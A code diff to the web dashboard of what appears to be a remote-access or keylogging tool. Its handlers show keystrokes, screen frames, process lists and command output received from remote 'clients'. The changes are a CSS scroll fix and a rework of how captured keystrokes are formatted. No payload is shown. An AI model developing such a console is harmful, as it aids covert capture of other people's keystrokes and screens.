@@ -353,7 +353,7 @@ input[type=text]:focus,input[type=number]:focus{border-color:rgba(0,255,136,0.4)
         <div style="flex-shrink:0;padding:10px 20px;border-bottom:1px solid var(--border);">
           <button class="btn btn-green btn-sm" onclick="getSysinfo()">↻ REFRESH</button>
         </div>
-        <div style="flex:1;overflow-y:auto;padding:16px 20px;">
+        <div style="flex:1;min-height:0;overflow-y:auto;padding:16px 20px;">
           <div id="sysinfo-content" class="no-data">Click REFRESH to load system info</div>
         </div>
       </div>
@@ -363,7 +363,7 @@ input[type=text]:focus,input[type=number]:focus{border-color:rgba(0,255,136,0.4)
         <div style="flex-shrink:0;padding:10px 20px;border-bottom:1px solid var(--border);">
           <button class="btn btn-green btn-sm" onclick="getProcesses()">↻ REFRESH</button>
         </div>
-        <div style="flex:1;overflow-y:auto;padding:0 20px 16px;">
+        <div style="flex:1;min-height:0;overflow-y:auto;padding:0 20px 16px;">
           <div id="proc-content" class="no-data">Click REFRESH to load processes</div>
         </div>
       </div>
@@ -405,12 +405,12 @@ socket.on('screen_frame', data => {
 socket.on('keylog_data', data => {
   if(!selectedClient || data.client_id !== selectedClient.id) return;
   const out = document.getElementById('keylog-output');
-  // Remove placeholder if present
-  const first = out.firstChild;
-  if(first && first.tagName === 'SPAN') out.innerHTML = '';
-  // Format: highlight special keys in brackets
-  const formatted = data.data.replace(/\[([^\]]+)\]/g, '<span class="kl-special">[$1]</span>');
-  out.innerHTML += formatted;
+  if(out.firstChild && out.firstChild.tagName === 'SPAN' && out.children.length === 1) out.innerHTML = '';
+  // Strip any [HH:MM:SS] timestamps that may come from old clients
+  let text = data.data.replace(/\[\d{2}:\d{2}:\d{2}\]\s*/g, '');
+  // Highlight special keys like [Enter], [BackSpace] etc in orange
+  text = text.replace(/\[([A-Za-z_]+)\]/g, '<span class="kl-special">[$1]</span>');
+  out.innerHTML += text;
   out.scrollTop = out.scrollHeight;
 });
 socket.on('cmd_response', data => {
